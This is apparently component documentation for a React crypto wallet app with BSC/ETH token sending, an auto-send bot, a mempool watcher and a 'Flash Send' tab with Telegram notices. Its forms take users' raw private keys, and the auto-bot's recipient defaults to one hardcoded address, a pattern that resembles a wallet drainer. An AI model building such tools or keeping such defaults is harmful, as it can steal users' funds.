# Components

## Component Tree

```
<App>
  ├── <header> .app-header
  │     └── Logo, Network Badge, Mobile Menu Button
  │
  ├── <nav> .nav-tabs
  │     └── NavTab × 7 (Dashboard, Send BSC, Send ETH, Token Info, Auto-Bot, Mempool, Flash Send)
  │
  ├── <main> .main-content
  │     └── (active tab component)
  │           ├── <Dashboard>
  │           ├── <SendBSC>
  │           ├── <SendETH>
  │           ├── <TokenInfo>
  │           ├── <AutoBot>
  │           ├── <MempoolWatcher>
  │           └── <FlashSend>
  │
  └── <footer> .app-footer
```

---

## Component Details

### `App.jsx`

**Purpose:** Root component. Manages active tab state, mobile menu toggle, and renders header, navigation, and footer.

**State:**
- `activeTab` — Currently active tab ID (`'dashboard'`, `'send-bsc'`, `'send-eth'`, `'token-info'`, `'auto-bot'`, `'mempool'`, `'flash-send'`)
- `mobileMenuOpen` — Boolean for mobile navigation toggle

**Tabs:**
```javascript
const TABS = [
  { id: 'dashboard',   label: 'Dashboard',       icon: '◈' },
  { id: 'send-bsc',    label: 'Send BSC',         icon: '⛓' },
  { id: 'send-eth',    label: 'Send ETH FB',      icon: '🛡' },
  { id: 'token-info',  label: 'Token Info',       icon: '◎' },
  { id: 'auto-bot',    label: 'Auto-Bot',         icon: '⚡' },
  { id: 'mempool',     label: 'Mempool Watch',    icon: '👁' },
  { id: 'flash-send',  label: 'Flash Send',       icon: '⚙' },
]
```

---

### `Dashboard.jsx`

**Purpose:** Landing page with quick action cards, network info chips, and security notes.

**Props:**
- `onNavigate(tabId: string)` — Callback to switch to a specific tab

**Sub-components:**
- `QUICK_ACTIONS` — Array of 6 action cards with icons, descriptions, and accent colors
- `NETWORK_INFO` — Array of 4 network statistic chips
- `SECURITY_CARDS` — 3 security advisory cards (warning, info)

---

### `SendBSC.jsx`

**Purpose:** BSC token transfer form with full EIP-1559 transaction building.

**State (form inputs):**
- `to` — Recipient address
- `amount` — Amount in human units
- `token` — Selected token from POPULAR_BEP20 (or 'CUSTOM')
- `customToken` — Custom token contract address
- `priorityGwei` — Priority fee in Gwei (default: 1.0)
- `maxFeeGwei` — Max fee override (optional)
- `gasLimit` — Gas limit (default: 100000)
- `privateKey` — Wallet private key
- `showKey` — Toggle key visibility
- `dryRun` — Dry-run mode flag

**Key Methods:**
- `handlePreview()` — Connects to RPC, fetches decimals/nonce/fees, builds transaction object, displays preview
- `handleSend()` — Signs and submits the transaction (or simulates in dry-run mode)

**Transaction Preview:** Displays a detailed config panel with all transaction parameters including wei amount, hex encoding cross-validation, and decimal verification.

---

### `SendETH.jsx`

**Purpose:** Ethereum token transfer via Flashbots Protect RPC.

**Same structure as SendBSC** but:
- Uses `ETH_RPCS` for chain state queries
- Submits signed transactions through `rpc.flashbots.net` (Flashbots Protect)
- ETH chain ID is 1
- Shows Flashbots tracker link instead of BscScan

---

### `TokenInfo.jsx`

**Purpose:** Token metadata lookup and wallet balance query.

**State:**
- `chain` — `'bsc'` or `'eth'`
- `token` — Selected token or 'CUSTOM'
- `customAddress` — Manual token contract address
- `walletAddress` — Optional wallet to check balance
- `result` — Token metadata object (symbol, name, decimals, totalSupply, walletBalance)

**ABI Used:**
```javascript
['function decimals() view returns (uint8)',
 'function symbol() view returns (string)',
 'function name() view returns (string)',
 'function totalSupply() view returns (uint256)',
 'function balanceOf(address) view returns (uint256)']
```

---

### `AutoBot.jsx`

**Purpose:** Scheduled automatic BSC token transfer bot.

**State:**
- All SendBSC form fields plus:
- `interval` — Send interval (seconds, or with suffix s/m/h)
- `maxCount` — Maximum sends before auto-stop
- `recipient` — Destination address (defaults to `0x9850f7eEAbe8E4FfF2662652aFF28b3De14C53F6`)
- `botStatus` — `'idle' | 'running' | 'paused' | 'stopped'`
- `logs` — Array of `{ time, msg, type }` log entries
- `stats` — `{ sent, failed, totalWei }` running statistics

**Sub-components:**
- `stats-bar` — Live sent/failed/status display
- `log-panel` — Scrollable log with color-coded entries (info, success, error, warning, highlight)

**Bot Lifecycle:**
```
idle → [Start] → running → [Pause] → paused → [Resume] → running
                     ↓                                       ↓
              [Stop/Completed] → stopped ← [Stop/Completed] ←
```

**Safety:**
- Uses `AbortController` for clean bot termination
- `pausedRef` for pausing mid-cycle
- `maxCount` limit to prevent runaway sends
- Balance validation before each transaction

---

### `MempoolWatcher.jsx`

**Purpose:** Real-time pending transaction monitor.

**State:**
- `chain` — `'bsc'` or `'eth'`
- `maxTx` — Maximum transactions to capture
- `timeout` — Watch duration in seconds
- `isWatching` — Boolean for active watch state
- `txs` — Array of `{ hash, time, id }` observed transactions

**Data Flow:**
1. Connect to chosen chain's RPC
2. Poll `eth_getBlockByNumber("pending", true)` every second
3. Extract transaction hashes from pending block
4. Deduplicate via `Set`, append to table
5. Stop when `maxTx` reached or `timeout` expires

---

### `FlashSend.jsx`

**Purpose:** Legacy USDT send on Ethereum with optional Telegram notification.

**State:**
- Standard send fields plus:
- `telegramToken` — Telegram bot token (optional)
- `telegramChatId` — Telegram chat ID (optional)
- `sendToTelegram` — Toggle Telegram notification
- `senderAddress` — Derived sender address (displayed after first input)

**Telegram Flow:**
```javascript
const msg = encodeURIComponent(`Transaction Info:\nTX Hash: ${hash}\n...`)
await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`)
```
